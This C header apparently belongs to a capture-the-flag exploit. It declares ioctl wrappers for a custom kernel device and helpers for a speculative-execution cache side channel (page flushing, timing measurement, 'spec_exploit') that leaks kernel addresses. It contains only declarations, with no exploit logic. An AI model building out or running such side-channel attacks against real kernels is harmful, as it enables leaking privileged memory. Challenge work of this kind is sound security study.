#ifndef _SOLVE_H_
#define _SOLVE_H_

#include <stddef.h>
#include <unistd.h>

#define PAGE_SIZE 0x1000
#define MAX 0xFF + 1

#define REPEAT 180
#define THRESHOLD 180

#define GET_TASKSTRUCT 31337
#define TOUCH_MEM      1337

typedef size_t addr_t;
typedef unsigned char byte_t;
typedef void (*measure_data_t)(size_t hits[MAX]);

struct ioctl_data {
    pid_t pid;
    char __pad[sizeof (pid_t)];
    addr_t task_struct;
};

struct page_data {
    char data[PAGE_SIZE];
};

extern int dev_fd;
extern int threshold;

#define COMM_GET(param)  ioctl(dev_fd, GET_TASKSTRUCT, param) 
#define COMM_TOUCH(addr) ioctl(dev_fd, TOUCH_MEM, addr) 

#define MMAP_MEM(size) mmap(NULL, size,                                 \
                            PROT_WRITE | PROT_READ,                     \
                            MAP_PRIVATE| MAP_ANONYMOUS | MAP_POPULATE,  \
                            -1, 0); 

#define FOR_EACH(var, start, end) for (ssize_t var = start; var < end; var++)

void flush_pages(struct page_data*);
void spec_exploit(size_t target_addr, struct page_data*);
void spec_exploit1(size_t target_addr, struct page_data*);
void perform_exploit(addr_t addr, size_t hits[MAX], struct page_data*, measure_data_t);
size_t measure(void* ptr);

addr_t get_kernel_address(addr_t task_struct, addr_t target);
int allocate_mmap_mem(void);
void deallocate_mmap_mem(void);

#endif
